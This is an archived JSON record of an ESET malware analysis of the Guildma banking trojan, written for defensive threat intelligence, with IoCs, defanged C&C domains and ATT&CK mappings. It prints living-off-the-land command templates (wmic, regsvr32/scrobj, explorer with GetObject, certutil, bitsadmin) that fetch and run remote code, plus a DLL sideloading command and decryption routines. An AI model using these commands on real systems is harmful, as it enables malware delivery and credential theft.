{
    "id": "1b44515a-ba16-4279-83a8-d17d4588db72",
    "created_at": "2022-10-25T16:48:14.862315Z",
    "updated_at": "2025-03-27T02:09:01.426113Z",
    "deleted_at": null,
    "sha1_hash": "96d1ff403eb0306a6afce709bc54b16480635775",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-03-14T15:31:05Z",
    "file_modification_date": "2020-03-14T15:31:05Z",
    "file_size": 501998,
    "plain_text": "# Guildma: The Devil drives electric\n\n**[welivesecurity.com/2020/03/05/guildma-devil-drives-electric](https://www.welivesecurity.com/2020/03/05/guildma-devil-drives-electric/)**\n\nMarch 5, 2020\n\nIn this blogpost, we will examine Guildma (also known as Astaroth, a powerful demon), a highly\nprevalent Latin American banking trojan. This Brazil-targeting trojan, written in Delphi, boasts\nsome innovative execution and attack techniques. We will describe the most recent version,\nhighlighting the most notable changes made since the middle of 2019 when an avalanche of\narticles about Guildma was published in response to its largest campaign to date.\n\n## Characteristics\n\nGuildma is a Latin American banking trojan that targets Brazil exclusively. Based on our telemetry\n— as well as the public attention it has received — we believe it to be the most impactful and\nadvanced banking trojan in the region. Besides targeting financial institutions, Guildma also\nattempts to steal credentials for email accounts, e‑shops and streaming services, and affects at\nleast ten times as many victims as other Latin American banking trojans already described in this\nseries. It uses innovative methods of execution and sophisticated attack techniques.\n\nUnlike the Latin American banking trojans we have described previously, Guildma does not store\nthe fake pop-up windows it uses within the binary. Instead, the attack is orchestrated by its C&C\nserver. This gives the authors greater flexibility to react to countermeasures implemented by the\ntargeted banks.\n\nGuildma implements the following backdoor functionalities:\n\nTaking screenshots\nCapturing keystrokes\nEmulating keyboard and mouse\nBlocking shortcuts (such as disabling Alt + F4 to make it harder to get rid of fake windows it\nmay display)\nDownloading and executing files\nRestarting the machine\n\nGuildma is very modular. At the time of writing, it consists of 10 modules, not including distribution\nchain stages. The functionality of individual modules will be discussed later.\n\n## Evolution of distribution chains\n\nOur telemetry indicates Guildma spreads exclusively through spam emails with malicious\nattachments. Here are a few examples from a campaign from the middle of November 2019.\n\n\n-----\n\n_Figure 1. Spam email example (translation: “Hello, please explain these photos to me. I’m waiting for your_\n\n_explanation!”)_\n\n_[Figure 2. Spam email example (translation: “Dear member of consórcio, attached is the proof of bid no.](https://thebrazilbusiness.com/article/consorcio-in-brazil)_\n\n_75432.”)_\n\n\n-----\n\n_Figure 3. Spam email example (translation: “Good morning, I am sending the proof of transfer – DOC._\n\n_Citibank”)_\n\n_Figure 4. Spam email example. Fake invoice reminder stating that a payment is due the day after tomorrow and_\n\n_that the payment may take up to 72 hours to be processed._\n\nOne of the defining characteristics of Guildma’s distribution chains is using tools already present\non the system, often in new and unusual ways.\n\n\n-----\n\nAnother characteristic is reusing techniques. New techniques are added every once in a while,\nbut for the most part, the developers seem to simply reuse techniques from older versions.\n\n_Figure 5. Distribution chain of Guildma in version 150_\n\nFigure 5 shows the distribution chain for version 150, but the structure of Guildma’s distribution\nchains is very dynamic. For instance, in previous versions, the malicious LNK file shown in Figure\n5 was not embedded in a ZIP archive, or an SFX RAR archive containing an MSI installer was\nused instead. Also, there used to be another JScript stage whose sole purpose was downloading\nand executing the final JScript stage; there have been too many changes overall to fit into this\narticle. In fact, the only part that has mostly stayed the same is the final JScript stage.\n\nUsing data from our long-term, in-depth tracking of this family, we have compiled a very good\npicture of Guildma’s activity.\n\nFigure 6 shows all ESET detections of Guildma’s first-stage component. As you can see, the\ncampaigns were ramping up slowly until a massive campaign in August 2019, when we were\nseeing up to 50,000 samples per day. This campaign went on for almost two months and\naccounted for more than double the amount of detections we had seen in the 10 months prior.\n\n_Figure 6. First stage Guildma detections since October 2018_\n\nFollowing is a summary of some of the more interesting techniques used in the last 14 months.\n\n### Execution of the JScript stage\n\n\n-----\n\nOver the last year, Guildma has used several methods of executing the JScript stages of its\ndistribution chain. At the end of 2018, Guildma was hiding its code in eXtensible Stylesheet\nLanguage (.xsl) files and using wmic.exe to download and execute them:\n\nwmic.exe <wmic query> /format:”<URL>”\n\nIt then briefly moved on to using regsvr32.exe and scrobj.dll to download a JScript-implemented\nCOM object and execute its registration routine (which contained the malicious code):\n\nregsvr32.exe /s /n /u /i:<URL> scrobj.dll\n\nMost recently, the authors started abusing Windows Explorer to execute the JScript stage. This\nattack relies on the fact that Windows Explorer will try to open any file passed to it on the\ncommand line with its associated program and the fact that the default association for .js files is\nthe Microsoft Windows Script Host. The “script” passed to Windows Explorer is a single command\nwhose purpose is to download and execute the actual JScript stage:\n\necho GetObject(‘script:<URL>’) > <file>.js | explorer.exe <random switches> <file>.js\n\n### Execution of the binary modules\n\nMethods of running the PE modules are no less diverse.\n\nWhen we started tracking Guildma, it was abusing Avast’s aswRunDll.exe to launch the first\nbinary stage, with regsvr32.exe as a failover for computers where Avast’s products weren’t\ninstalled. The use of aswRunDll.exe was then dropped, leaving regsvr32.exe as the sole method\nof execution. After a brief period of using rundll32.exe, Guildma switched to its current execution\nmethod — ExtExport.exe.\n\nExtExport.exe is an undocumented component of Microsoft Internet Explorer used for exporting\nbookmarks from Mozilla Firefox and 360 Secure Browser, and can be abused for DLL SideLoading. When the following command is executed, mozcrt19.dll, mozsqlite3.dll, and sqlite3.dll\nare loaded from the folder specified on the command line:\n\nC:\\Program Files\\Internet Explorer\\ExtExport.exe <folder> <dummy 1> <dummy 2>\n\nTo abuse this, you would normally drop the DLL to be loaded as one of the above-mentioned files;\nGuildma uses all three.\n\n### Downloading the binary modules\n\nGuildma has also utilized a couple of different ways to download the binary modules. The first\nversion was using certutil.exe copied to certis.exe (presumably to evade detection):\n\ncertis.exe -urlcache -split -f “<URL>” “<destination path>”\n\nThe authors then switched to BITSAdmin — the Microsoft Background Intelligent Transfer Service\nmanagement tool — and are still using it at the time of writing:\n\nbitsadmin.exe /transfer <random number> /priority foreground <URL> <destination>\n\n\n-----\n\nFor a couple months, the binary modules were base64-encoded and hosted on Google Cloud. In\nthat time, Guildma was using both BITSAdmin and certutil — BITSAdmin to download the\nmodules and certutil to decode them.\n\n### Other changes\n\nGuildma uses strange, non-descriptive variable and function names. When we started tracking\nGuildma, the names, while nonsensical, were clearly man-made (e.g. “radador” for the random\nnumber function or “Bxaki” for the download function). In June 2019 they were all changed to\nrandom-looking names (e.g. “bx021” and “mrc430”). At first, we thought the authors implemented\nsome kind of an automated script obfuscator, but it turned out to be a onetime change and the\nnames have remained the same since.\n\n[A relatively new addition is the age-old technique of using ADS (Alternate Data Streams) to store](https://attack.mitre.org/techniques/T1096/)\nthe binary modules. All the modules are now stored as ADS of a single file (e.g.\n_“desktop.ini:nauwuygiaa.jpg”, “desktop.ini:nauwuygiab.jpg”, etc.)._\n\n## Version history\n\nGuildma has seemingly gone through many versions during its development, but there was\nusually very little development between versions — due to its clunky architecture utilizing\nhardcoded configuration values, for the most part the authors have to recompile all the binaries\nfor every new campaign. A job that is clearly not completely automated, since there has often\nbeen a significant delay between updating the version number in the scripts and in the binaries.\n\nIn this article, we cover version 150, but since we started writing, two more versions have been\nreleased. They contain no substantial change in functionality or distribution, supporting our claims\nabout Guildma’s development cycle.\n\nThe final stage of the distribution chain used to contain a version name (and even before that, it\nused to download said name along with the binary modules), but it has been (presumably)\npermanently replaced with a simple “xXx” since version 148.\n\nTable 1 summarizes all the versions released since we started tracking Guildma actively in\nOctober 2018. Looking at the version strings, we get the feeling the author is passionate about\necology and fast cars.\n\n_Table 1. Guildma version history_\n\n#### First seen Version number Version name Version prefix\n\n 2018-09-18 131 131_SUPER_Tesla marxvxinhhm\n\n 2018-10-31 132 132_ULTRA_Tesla srsysddirrx\n\n 2018-11-28 133 133_TORRE_DE_Tesla mxgetronicosxy\n\n 2018-11-29 134 134_MAXX_TESLAs dwqiopawsamazon\n\n\n-----\n\n#### First seen Version number Version name Version prefix\n\n 2018-12-03 135 135_MOAB_TESLAs lu769tsla\n\n 2018-12-13 136 136_KRAKEN_TESLAs lrdsnhrxxfery\n\n 2019-02-06 137 137_RAPTOR_TESLAs rakpat0rpcack\n\n 2019-03-21 138 138_RAPTOR_TESLAs_ hillwd763free\n\n 2019-05-20 139 139_TESLA_ falxconxrenw\n\n 2019-06-03 140 140_ASTH_ valehraysystqx\n\n 2019-06-24 141 141_T3SL4S_ ayt3ese4xw\n\n 2019-07-17 142 142_T3SL4S_ halawxtz\n\n 2019-08-09 143 143_T3SL4S_ asmonnwqk\n\n 2019-08-26 144 144_MULT1T3SL4S_ daffsyshqy\n\n 2019-09-26 145 145_MULT1T3SL4S_ landoqeahjky\n\n 2019-10-16 146 146_MULT1T3SL4S_ valkanxpca\n\n 2019-11-04 147 147_MULT1T3SL4S_ koddsuffy\n\n 2019-11-19 148 xXx lpquayevvt\n\n 2019-11-22 149 nauwuygia\n\n 2019-12-13 150 andrealfo\n\n 2020-01-14 151 balberith\n\n 2020-02-05 152 masihaddajjal\n\n## Module overview\n\nAs mentioned earlier, Guildma is very modular; the structure of its modules seems to be mostly\nconstant. In this section, we will briefly describe the functionality of each module.\n\nAll module names are composed of a shared, version-dependent prefix and a module-specific\nsuffix. In Table 2, the version-dependent prefix is andrealfo.\n\n_Table 2. Guildma module overview_\n\n\n#### URL filename\n\n\n#### Filesystem filename Module\n\n\n#### andrealfohh1a.dll.zip andrealfo64.~ Main module loader 1 (part 1)\n\n\n-----\n\n#### URL filename\n\n\n#### Filesystem filename Module\n\n\n#### andrealfohh1b.dll.zip Main module loader 1 (part 2)\n\n andrealfoxa.gif.zip andrealfoxa.gif Main module injector (part 1)\n\n andrealfoxb.gif.zip andrealfoxb.gif Main module injector (part 2)\n\n andrealfoxc.gif.zip andrealfoxc.gif Main module injector (part 3)\n\n andrealfogx.gif.zip andrealfogx.gif Main module loader 2\n\n andrealfog.gif.zip andrealfog.gif Main module\n\n andrealfoc.jpg.zip andrealfoc.jpg Contacts stealer and form grabber module\n\n\n#### andrealfod‐ wwn.gif.zip\n\n\n#### andrealfodwwn.gif RAT module (DLL)\n\n\n#### andrealfodx.gif.zip andrealfodx.gif RAT module (EXE)\n\n andrealfoa.jpg.zip andrealfoa.jpg MailPassView\n\n andrealfob.jpg.zip andrealfob.jpg WebBrowserPassView\n\n andrealfoi.gif.zip andrealfoi.gif JScript dropper module\n\nWith the exception of the main module loader 1 (*64.~) and the main module injector (*xa.gif,\n*xb.gif and *xc.gif), all the modules are encrypted with a simple XOR cipher using a repeating 32byte key. The key is generated from a 32-bit seed using the algorithm shown in Figure 7. The\nseed value is obfuscated in the binaries to prevent simple extraction (see Figure 8).\n\n\n#### 1\n\n 2\n\n 3\n\n 4\n\n\n#### key = bytearray ();\n\n for i in range ( 32 ):\n\n key . append ( seed & 0xff );\n\n seed >>= 1;\n\n\n_Figure 7. Key generation algorithm_\n\n\n-----\n\n_Figure 8. Seed obfuscation in the binary_\n\nThree modules communicate with a C&C server: Main module, RAT module, and Contacts\nstealer and form grabber. The communication is done over HTTP(S) using a combination of\nbase64 and various simple custom encryption algorithms to protect the data being transferred.\n\nIn the next section, we describe how the C&C server address is obtained.\n\n### Main module loader 1 (*64.~)\n\nThis is the first binary stage of the chain. The file is a DLL downloaded in two parts, which are\nconcatenated by the previous JScript stage. It loads the three files comprising the next stage\nloader (*xa.gif, *xb.gif and *xc.gif), concatenates them, maps the resulting PE file into its own\naddress space and executes it.\n\n[Loading a PE file is a relatively complex process, so the authors used the BTMemoryModule](https://github.com/DSPlayer/memorymodule/blob/master/BTMemoryModule/BTMemoryModule.pas)\nopen-source library for this purpose.\n\n### Main module injector (*xa.gif + *xb.gif + *xc.gif)\n\nThis module loads the next stage (*gx.gif) from disk and decrypts it. It then runs the first existing\nexecutable from the following list and injects the decrypted payload into it.\n\nC:\\Program Files\\AVAST Software\\Avast\\aswRunDll.exe\nC:\\Program Files\\Diebold\\Warsaw\\unins000.exe *\nC:\\Windows\\SysWOW64\\userinit.exe\nC:\\Windows\\System32\\userinit.exe\n\n\n\n- An application, popular in Brazil, to protect access to online banking.\n\n### Main module loader 2 (*gx.gif)\n\nThe last loader stage is very simple and seems to needlessly duplicate the functionality of main\nmodule loader 1. It loads and decrypts the main module (*g.gif), maps it into its own memory\nspace and executes it.\n\n### Main module (*g.gif)\n\n\n-----\n\nGuildma’s main module orchestrates all the remaining modules. Its implementation is deceptively\ncomplex, using countless timers and events, but its functionality is actually relatively simple. It\ncontains legacy code that is not being used anymore as well as pre-production code that is not\nbeing used yet.\n\nOn loading, this module checks if it is running in a sandboxed environment (for example, by\nexamining the computer name and system disk volume ID), if there are other running instances of\nitself (based on window names) and if the system locale is different from Portuguese. If any check\nreveals the system is uninteresting or already compromised by Guildma, the malware terminates.\n\nOtherwise, the module then collects information from the system (computer name, which security\nsoftware is being used, installed programs…) and establishes contact with the C&C server. It then\nstarts monitoring interesting events, mainly when certain applications are launched or online\nbanking sites opened, and executing appropriate actions (e.g. taking screenshots, preventing the\nuser from closing the window by intercepting keyboard shortcuts, launching the RAT module, and\nso on).\n\nThe module also implements backdoor commands whose functionality largely overlaps with the\nRAT module.\n\n### Contact stealer and form grabber (*c.jpg)\n\nThis module has two functions — gathering email addresses and form data from webpages.\n\nEmail addresses are obtained from desktop email clients (such as Microsoft Outlook, Thunderbird\nand The Bat!) by parsing their address books as well as the emails themselves.\n\nThe form grabber uses Windows COM technology to interact with Internet Explorer. It waits until a\ntargeted site is opened (mostly Brazilian webmails, e-shops and payment gateways) and then\nlogs the user out, forcing the victim to input credentials. It then retrieves the DOM and looks for\nimportant input field values (such as usernames, passwords and credit card numbers).\n\n### RAT module (*dwwn.gif, *dx.gif)\n\nThe RAT module comes in two functionally identical compilations — DLL (*dwwn.gif) and EXE\n(*.dx.gif).\n\nIt implements download and execute functionality, can take screenshots, emulate keyboard and\nmouse input, and restart the computer.\n\nMost Latin American banking trojans display fake pop-up windows based on monitoring the active\nwindow’s name. These windows are usually stored in the binary. We have not found such code in\nGuildma, but the RAT module contains a Delphi form implementing a simple web browser. Since\nit is also executed based on the active window’s name, we believe this form is used for displaying\nfake dialogs to the user.\n\n### MailPassView (*a.jpg) and BrowserPassView (*b.jpg)\n\n\n-----\n\nThese are freeware tools from Nirsoft for extracting saved credentials from popular email clients\nand web browsers respectively. Since Nirsoft has removed support for quiet operation (output to\nfile, with no GUI) from newer versions to curb the abuse of these tools by malware, Guildma’s\nauthors are using older versions that had those features. The same tools are also leveraged by\n[Mispadu, except Mispadu is using newer versions with quiet operation support patched back in.](https://www.welivesecurity.com/2019/11/19/mispadu-advertisement-discounted-unhappy-meal/)\n\n### JScript dropper module (*i.gif)\n\nThis module drops and executes (using cscript.exe) a JScript file. The script consists of two parts\n— the first part is stored as one long encrypted string, while the second part is assembled from\nmany short strings (some encrypted and some in plaintext). Worthy of note is the fact that strings\nin the dropped JScript file are encrypted by this dropper module with a randomly generated key,\nso they are present in the clear in the dropper.\n\nThe script executes the following actions:\n\nDisables UAC\nDisables EXE signature checking\nDisables Windows Defender\nCreates a firewall rule disabling network access for\nC:\\Program Files\\AVAST Software\\Avast\\Setup\\avast.setup\nDisables wsddntf driver (Diebold Warsaw GAS Tecnologia — the banking access protection\nsoftware introduced earlier)\nAdds a firewall exception for files used as injection targets\n\nC:\\Program Files\\Diebold\\Warsaw\\unins000.exe\nC:\\Program Files\\AVAST Software\\Avast\\aswRunDll.exe\n\nWe believe this module may still be in development as we have never observed it on our test\nmachines dropping the script.\n\n## New developments (since mid-2019)\n\n### New C&C retrieval\n\nIn version 142, a new way of distributing C&C servers, abusing YouTube and Facebook profiles,\nwas implemented. However, the authors stopped using Facebook almost immediately and, at the\n[time of writing, are fully relying on YouTube. This is similar to Casbaneiro, but a bit cruder. While](https://www.welivesecurity.com/2019/10/03/casbaneiro-trojan-dangerous-cooking/)\nCasbaneiro was hiding the data in video descriptions and obfuscating it as a part of a URL,\nGuildma simply places the data in the channel description. The start and end of the encrypted\nC&C addresses is delimited by “|||”. The data in between is base64 encoded and encrypted using\n[Mispadu’s string encryption algorithm. This is now the primary method of retrieving C&C servers;](https://www.welivesecurity.com/2019/11/19/mispadu-advertisement-discounted-unhappy-meal/)\n[the old method (described by Avast) is still present as a backup.](https://decoded.avast.io/threatintel/deep-dive-into-guildma-malware/)\n\n\n-----\n\n_Figure 9. Encrypted Guildma C&C server domains stored on YouTube_\n\n### Modules added and removed\n\nThe previously described JScript dropper module was added in version 145. Conversely, in\nversion 139, Guildma dropped two other modules present in older versions — mass mailer (*f.jpg)\nand its loader (*e.jpg). In the next few versions, these modules were still accessible under the\nexpected names (<version prefix>e.jpg and <version prefix>f.jpg) from the same server as the\nother modules. This leads us to believe these modules are still being developed, but are now only\ndistributed as needed, presumably using the download and execute backdoor command.\n\n### New string encryption\n\nThe JScript dropper module brought with it a new string encryption algorithm. A variant of this\nalgorithm (shown in Figure 10) was propagated into other modules in version 147.\n\n\n-----\n\n#### 1\n\n 2\n\n 3\n\n 4\n\n 5\n\n 6\n\n 7\n\n 8\n\n 9\n\n 10\n\n 11\n\n 12\n\n 13\n\n 14\n\n 15\n\n 16\n\n 17\n\n 18\n\n 19\n\n 20\n\n 21\n\n 22\n\n 23\n\n 24\n\n 25\n\n 26\n\n\n#### def decrypt ( ct, key ):\n\n # stage 1\n\n ct = unhexlify ( ct );\n\n last = ct [ 0 ];\n\n s = bytearray ( ct [ 1 : ] );\n\n for i in range ( len ( s ) ):\n\n x = s [ i ] ^ key [ i % len ( key ) ];\n\n if last > x:\n\n x += 0xff;\n\n x -= last;\n\n last = s [ i ];\n\n s [ i ] = x;\n\n # stage 2 - reverse string\n\n s = s [::-1];\n\n # stage 3 - c = not ( c - 10 )\n\n s = \"\" . join ( [ chr ( ( ~( c - 10 ) ) & 0xff ) for c in s ] );\n\n # stage 4 - Base25 decode and key subtraction\n\n k = ord ( s [ 0 ] ) - 65;\n\n ot = \"\";\n\n for i in range ( 1, len ( s ), 2 ):\n\n ot += chr ( ( ord ( s [ i ] ) - 65 ) * 25 + ord ( s [ i + 1 ] ) - 65 - k - 100 );\n\n return ot;\n\n\n_Figure 10. New string encryption algorithm_\n\n\n-----\n\n[Originally, Guildma was using the same string encryption as Casbaneiro. The new algorithm has](https://www.welivesecurity.com/2019/10/03/casbaneiro-trojan-dangerous-cooking/)\nfour stages and as you can see, the original string encryption algorithm is still used as the first\n[stage. Also of note is the fact that the fourth stage is once again using Mispadu’s encryption](https://www.welivesecurity.com/2019/11/19/mispadu-advertisement-discounted-unhappy-meal/)\nalgorithm.\n\nIn version 148 Guildma implemented a string table; all strings are decrypted at the beginning of\nexecution and accessed from the table when needed.\n\n### Removal of international targets\n\nIn version 138, Guildma added capability to target institutions (mainly banks) outside of Brazil.\nDespite that, we have observed no international campaigns; the campaigns hosting files on\nCloudflare Workers’ infrastructure even went as far as to block any downloads from non-Brazilian\nIPs. In fact, in the last 14 months we haven’t seen any campaign targeting users outside of Brazil.\n\nFinally, in version 145, the capability to target institutions outside of Brazil was removed. Based\non these facts, we believe it was merely an in-development feature which ended up being\nscrapped.\n\n## Conclusion\n\nIn this part of the series, we have talked about Guildma, the most prevalent Latin American\nbanking trojan we have seen. We have shown its rich historical developments while focusing on\nthe most recent variant.\n\nGuildma once again shares the prevailing characteristics of a Latin American banking trojan. It is\nwritten in Delphi, targets the region, implements backdoor functionality, splits its functionality into\nmany modules and abuses legitimate tools.\n\nGuildma also shares interesting common features with families described earlier in this series.\nNamely, its current encryption algorithm combines the ones used by Casbaneiro and Mispadu.\n\n_For any inquiries, contact us at threatintel@eset.com. Indicators of Compromise can also be_\n_[found in our GitHub repository.](https://github.com/eset/malware-ioc/tree/master/guildma)_\n\n## Indicators of Compromise (IoCs)\n\n### Hashes\n\n\n#### SHA-1 Description\n\n\n#### 45c58bc40768d‐ ce6a6c611e08fd34c62441aa776\n\n\n#### Main module loader 1\n\n\n#### ESET Detection name\n\n Win32/Spy.Guild‐ ma.BM\n\n Win32/Spy.Guild‐ ma.BJ\n\n\n#### 861f20b0dcc55f94b4c43e4a7e77f042c21506cf Main module injector\n\n\n-----\n\n#### SHA-1 Description\n\n\n#### 37fd19b1ab1dcc25e07bc96d4c02d81cf4ed‐ b8a1\n\n\n#### Main module loader 2\n\n\n#### ESET Detection name\n\n Win32/Spy.Guild‐ ma.Q\n\n\n#### a7b10b8de2b0ef898cff31fa2d9d5cbaae2e9d0d Main module Win32/Spy.Guild‐ ma.BS\n\n\n#### 4f65736a9d6b94b376c58b3cdcb49bb‐ d295cd8cc\n\n\n#### Contacts steal‐ er and form grabber\n\n\n#### Win32/Spy.Guild‐ ma.D\n\n Win32/Spy.Guild‐ ma.BR\n\n Win32/Spy.Guild‐ ma.BR\n\n\n#### 6c9304c5862d4e0de1c86d7ae3764f5e8358daff RAT module (DLL)\n\n 89fbffe456de850f7abf4f97d3b9da4bad6afb57 RAT module (EXE)\n\n\n#### af0d495ecc3622b14a40ddcd8005873c5dd‐ c3a2d\n\n 92bcf54079cbba04f584eac4486473c3abd‐ d88cd\n\n\n#### MailPassView Win32/PSWTool.‐ MailPassView.E\n\n\n#### WebBrowser‐ PassView\n\n\n#### a2048f435f076988bf094274192a196216d75a5f JScript dropper module\n\n### Filenames\n\nC:\\Users\\Public\\Libraries\\qlanl\\*\n\n### Startup link\n\nLocation\n\n\n#### Win32/PSWTool.W ebBrowserPass‐ View.E\n\n Win32/Spy.Guild‐ ma.BP\n\n\n%APPDATA%\\Microsoft\\Programs\\StartUp\\reiast%USERNAME%%COMPUTERNAME%.lnk\n\nTargets\n\nC:\\Program Files (x86)\\Internet Explorer\\ExtExport.exe\nC:\\Program Files\\Internet Explorer\\ExtExport.exe\n\nArgs\n\n<install dir> <rand> <rand>\n(where <rand> is a random, 5 to 9 character long string generated from the alphabet\nqwertyuiop1lgfdsas2dfghj3zcvbnmm)\n\n### C&C servers\n\n\n-----\n\nhttps://www.zvatrswtsrw[.]ml\nhttps://xskcjzamlkxwo[.]gq\nhttps://www.vhguyeu[.]ml\nhttps://www.carnataldez[.]ml\nhttps://www.movbmog[.]ga\nhttps://iuiuytrytrewrqw[.]gq\nhttps://www.gucinowertr[.]tk\nhttps://equilibrios[.]ga\nhttps://www.clooinfor[.]cf\nhttps://ambirsr[.]tk\nhttps://dbuhcbudyu[.]tk\nhttps://nvfjvtntt[.]cf\nhttp://whia7g.acquafufheirybveru[.]online\n\n## MITRE ATT&CK techniques\n\n#### Tactic ID Name Description\n\n\n#### Initial Ac‐ cess\n\n Exe‐ cution\n\n Per‐ sis‐ tence\n\n De‐ fense Eva‐ sion\n\n\n#### T1193 Spearphish‐ ing Attachment\n\n\n#### T1089 Disabling Se‐ curity Tools\n\n T1140 Deobfuscate/ Decode Files or Information\n\n T1073 DLL Side- Loading\n\n T1096 NTFS File Attributes\n\n\n#### Guildma distribution chains start with a malicious email attachment.\n\n\n#### T1073 Rundll32 Guildma utilizes rundll32.exe to execute its binary modules.\n\n\n#### T1047 Windows Management Instrumenta‐ tion\n\n T1060 Registry Run Keys / Start‐ up Folder\n\n\n#### Guildma abuses WMIC.exe to execute some of its distribution chain stages.\n\n Guildma ensures persistence by creating a LNK file in the %STARTUP% folder.\n\n\n#### T1197 BITS Jobs BITSAdmin.exe is used to download binary modules.\n\n\n#### Guildma disables Windows Defender.\n\n The majority of Guildma modules need to be decrypt‐ ed after downloading.\n\n Guildma abuses ExtExport.exe for DLL Side-Loading.\n\n Guildma utilizes ADS to hide its modules on disk.\n\n\n-----\n\n#### Tactic ID Name Description\n\n\n#### T1055 Process Injection\n\n\n#### Guildma utilizes process injection when executing its modules.\n\n\n#### T1064 Scripting Guildma implements its distribution chain stages in various scripting languages (mainly JScript).\n\n\n#### Guildma utilizes XSL script(s) in its distribution chains.\n\n Guildma extracts credentials stored by web browsers and email clients in files.\n\n Guildma extracts credentials stored by web browsers and email clients in Windows Registry.\n\n Guildma uses presence of certain files to determine whether banking and security tools are installed.\n\n Guildma uses window discovery to find and terminate older versions of itself and to detect when interesting programs (e.g. banking applications or web browsers) are running.\n\n Guildma detects the presence of several security products.\n\n Guildma collects OS version and bitness, computer name and system locale.\n\n Guildma uses directory names, computer names, vol‐ ume IDs, and existence of named objects to detect sandboxes and virtualized environments.\n\n Guildma is capable of taking screenshots.\n\n New C&C addresses are encrypted using custom en‐ cryption algorithms.\n\n Guildma uploads screenshots and log files to the C&C server.\n\n\n#### Cre‐ den‐ tial Ac‐ cess\n\n Dis‐ cov‐ ery\n\n Col‐ lec‐ tion\n\n Com‐ mand and Con‐ trol\n\n Exfil‐ tration\n\n\n#### T1220 XSL Script Processing\n\n T1081 Credentials in Files\n\n T1214 Credentials in Registry\n\n T1083 File and Di‐ rectory Discovery\n\n T1010 Application Window Discovery\n\n T1063 Security Soft‐ ware Discovery\n\n T1082 System Infor‐ mation Discovery\n\n T1497 Virtualization/ Sandbox Evasion\n\n T1113 Screen Capture\n\n T1024 Custom Cryptograph‐ ic Protocol\n\n T1041 Exfiltration Over Com‐ mand and Control Channel\n\n\n-----\n\n[ESET Research 5 Mar 2020 - 11:30AM](https://www.welivesecurity.com/author/esetresearch/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.03.05_Guildma/Guildma_%20The%20Devil%20drives%20electric%20_%20WeLiveSecurity.pdf"
    ],
    "report_names": [
        "Guildma_ The Devil drives electric _ WeLiveSecurity"
    ],
    "threat_actors": [
        {
            "id": "bc289ba8-bc61-474c-8462-a3f7179d97bb",
            "created_at": "2022-10-25T16:07:24.450609Z",
            "updated_at": "2025-03-27T02:02:10.235933Z",
            "deleted_at": null,
            "main_name": "Avalanche",
            "aliases": [],
            "source_name": "ETDA:Avalanche",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041341,
    "ts_creation_date": 1584199865,
    "ts_modification_date": 1584199865,
    "files": {
        "pdf": "https://archive.orkl.eu/96d1ff403eb0306a6afce709bc54b16480635775.pdf",
        "text": "https://archive.orkl.eu/96d1ff403eb0306a6afce709bc54b16480635775.txt",
        "img": "https://archive.orkl.eu/96d1ff403eb0306a6afce709bc54b16480635775.jpg"
    }
}